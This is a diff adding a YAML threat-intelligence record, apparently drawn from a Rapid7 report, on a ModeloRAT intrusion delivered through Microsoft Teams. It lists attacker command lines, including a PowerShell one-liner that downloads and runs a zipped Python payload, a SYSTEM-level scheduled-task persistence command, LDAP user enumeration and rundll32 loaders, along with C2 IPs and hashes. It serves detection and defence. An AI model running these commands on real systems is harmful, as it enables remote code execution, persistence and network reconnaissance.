@@ -1,0 +1,159 @@
+title: Enterprise Intrusion via Microsoft Teams and ModeloRAT
+description: Attackers used Microsoft Teams external access to deliver a Python payload
+  that established command-and-control, deployed multiple backdoors, and began mapping
+  the internal environment.
+attribution: ''
+malware_families:
+- ModeloRAT
+cves:
+- CVE-2023-36036
+ttps:
+  processes:
+  - pythonw.exe
+  - powershell.exe
+  - rundll32.exe
+  - schtasks.exe
+  - wsmprovhost.exe
+  - DumpIt.exe
+  command_lines:
+  - iwr -Uri "https://www.dropbox[.]com/scl/fi/[REDACTED]/vuzggemyofftzpk6.zip?rlkey=elabnna8r5omwglaq4feay6ui&st=op5i7lea&dl=1"
+    -OutFile "$env:appdata\Winp.zip";Expand-Archive -Path "$env:appdata\Winp.zip"
+    -DestinationPath "$env:appdata";rm "$env:appdata\Winp.zip";Start-Sleep -Seconds
+    5;Start-Process $env:appdata\WPy64-31401\python\pythonw.exe -ArgumentList $env:appdata\WPy64-31401\python\collector.py;Start-Sleep
+    -Seconds 30;Start-Process $env:appdata\WPy64-31401\python\pythonw.exe -ArgumentList
+    $env:appdata\WPy64-31401\python\Pmanager.py;Start-Sleep -Seconds 5
+  - rundll32.exe ssss.dll startproc Mw2[REDACTED]
+  - schtasks /create /tn TempLogA/tr "C:\Users\USER\AppData\Roaming\WPy64-31401\python\pythonw.exe
+    internal.py"/sc daily /st 13:00 /ru SYSTEM /rl HIGHEST /f
+  - rundll32.exe com6848.dll,open e8vy[REDACTED]
+  - iwr -Uri "https://www.dropbox[.]com/scl/fi/[REDACTED]/vuzggemyofftzpk6.zip?rlkey=elabnna8r5omwglaq4feay6ui&st=op5i7lea&dl=1"
+    -OutFile "$env:appdata\Winp.zip"; Expand-Archive -Path "$env:appdata\Winp.zip"
+    -DestinationPath "$env:appdata"; rm "$env:appdata\Winp.zip"; Start-Sleep -Seconds
+    5; Start-Process $env:appdata\WPy64-31401\python\pythonw.exe -ArgumentList $env:appdata\WPy64-31401\python\collector.py;
+    Start-Sleep -Seconds 30; Start-Process $env:appdata\WPy64-31401\python\pythonw.exe
+    -ArgumentList $env:appdata\WPy64-31401\python\Pmanager.py; Start-Sleep -Seconds 5
+  - pythonw.exe ...\python\Pmanager.py start
+  - rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C%24/Windows
+  - powershell -NonInteractive -NoProfile -WindowStyle Hidden -Command "(Get-CimInstance
+    Win32_ComputerSystem).Domain"
+  - schtasks /create /tn TempLogA   /tr "C:\Users\USER\AppData\Roaming\WPy64-31401\python\pythonw.exe
+    internal.py" /sc daily /st 13:00 /ru SYSTEM /rl HIGHEST /f
+  powershell:
+  - (Get-CimInstance Win32_ComputerSystem).Domain
+  - $d = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetDirectoryEntry().distinguishedName;$s
+    = New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://$d");$s.PageSize
+    = 1000;$s.Filter = "(objectClass=user)";$s.FindAll().Count
+  - $d = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetDirectoryEntry().distinguishedName$s
+    = New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://$d")$s.PageSize
+    = 1000$s.Filter = "(objectClass=user)"$s.FindAll().Count
+  - rundll32.exe ssss.dll startproc Mw2[REDACTED]
+  - schtasks /create /tn TempLogA   /tr "C:\Users\USER\AppData\Roaming\WPy64-31401\python\pythonw.exe
+    internal.py" /sc daily /st 13:00 /ru SYSTEM /rl HIGHEST /f
+  - rundll32.exe com6848.dll,open e8vy[REDACTED]
+  scripts:
+  - collector.py
+  - Pmanager.py
+  - USOShared1297.py
+  - Microsoft5237.py
+  - internal.py
+  - Dell508.py
+  - PCDr6967.py
+  registry_keys:
+  - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SyncRootManager\PLURIBUS!*
+  image_loads:
+  - ssss.dll
+  - testdllLPE.dll
+  network_connections:
+  - pythonw.exe -> 46.225.231[.]170:80
+  - pythonw.exe -> 144.172.99[.]68:80
+  - pythonw.exe -> 64.94.85[.]158:80
+  - pythonw.exe -> 140.82.6[.]45:80
+  - pythonw.exe -> 45.76.241[.]51:80
+  - internal.py -> 87.120.186[.]229:80
+  - internal.py -> 149.248.78[.]202:80
+  - USOShared1297.py -> 144.172.88[.]18:50508
+  - USOShared1297.py -> 64.190.113[.]187:50508
+  - USOShared1297.py -> 45.59.122[.]231:50508
+  - USOShared1297.py -> 144.172.88[.]18:60503
+  - USOShared1297.py -> 64.190.113[.]187:60503
+  - USOShared1297.py -> 45.59.122[.]231:60503
+  - Microsoft5237.py -> 87.120.186[.]229:80
+  - Microsoft5237.py -> 149.248.78[.]202:80
+  - Dell508.py -> 207.246.114[.]50:80
+  - Dell508.py -> 149.28.96[.]170:80
+  - PCDr6967.py -> 96.9.125[.]29:50504
+  - PCDr6967.py -> 144.172.111[.]49:50504
+  - PCDr6967.py -> 104.194.152[.]246:50504
+  - pythonw.exe -> 46.225.231.170:80
+  - pythonw.exe -> 144.172.99.68:80
+  - pythonw.exe -> 64.94.85.158:80
+  - pythonw.exe -> 140.82.6.45:80
+  - pythonw.exe -> 45.76.241.51:80
+  - pythonw.exe -> 87.120.186.229:80
+  - pythonw.exe -> 149.248.78.202:80
+  - pythonw.exe -> 96.9.125.29:50504
+  - pythonw.exe -> 144.172.111.49:50504
+  - pythonw.exe -> 104.194.152.246:50504
+  - pythonw.exe -> 207.246.114.50:80
+  - pythonw.exe -> 149.28.96.170:80
+  - cmd.exe -> example[.]com:443
+  file_activity:
+  - $env:appdata\Winp.zip
+  - $env:appdata\WPy64-31401\
+  - '%TEMP%\configA.json'
+  - '%TEMP%\cldflt\Link.log'
+  persistence:
+  - Scheduled task (TempLogA) to execute internal.py daily at 13:00 with SYSTEM privileges
+  - Registry Persistence Key (HKLM) pointing to a scheduled task that runs internal.py
+    daily at 13:00 with SYSTEM privileges
+  - Registry Run key (HKCU) pointing to C:\Users\Admin\AppData\Local\Temp\update.exe
+  process_relations:
+  - pythonw.exe -> wsmprovhost.exe
+iocs:
+  hashes:
+  - b00c1cbcfb98d2618a5c2ccb311da94f3c57709a397be6c8de29839f4e943976
+  - d84245f3a374dd5eff8ecfdfad39077d76331fde799e5306430d0fc788db7f1d
+  - 930263c0843744e269b615fb2ec79f83d7bd8b2cbf75e31fd5ea6c1aaa4e48fd
+  - 30e5a6c982396cdf3157195b540f75096869baa8570f66fab88c07c161be27f0
+  - f5b2dbd8ec9671c0261f093ebc5f3d35920b592458a3b800cc946265111e67d0
+  ip_addresses:
+  - 46.225.231[.]170
+  - 144.172.99[.]68
+  - 64.94.85[.]158
+  - 140.82.6[.]45
+  - 45.76.241[.]51
+  - 87.120.186[.]229
+  - 149.248.78[.]202
+  - 144.172.88[.]18
+  - 64.190.113[.]187
+  - 45.59.122[.]231
+  - 207.246.114[.]50
+  - 149.28.96[.]170
+  - 96.9.125[.]29
+  - 144.172.111[.]49
+  - 104.194.152[.]246
+  - 46.225.231.170
+  - 144.172.99.68
+  - 64.94.85.158
+  - 140.82.6.45
+  - 45.76.241.51
+  - 87.120.186.229
+  - 149.248.78.202
+  - 96.9.125.29
+  - 144.172.111.49
+  - 104.194.152.246
+  - 207.246.114.50
+  - 149.28.96.170
+  domains: []
+  urls:
+  - hxxps://www.dropbox[.]com/scl/fi/[REDACTED]/vuzggemyofftzpk6.zip?rlkey=elabnna8r5omwglaq4feay6ui&st=op5i7lea&dl=1
+authors:
+- Rapid7
+- Anna Sirokova
+- Ivan Feigl
+- Alexandra Blia
+- Maor Weinberger
+- Anna Katarina Quinn
+reference: https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise
+date_of_publication: May 13, 2026
+file_creation_date: May 14, 2026
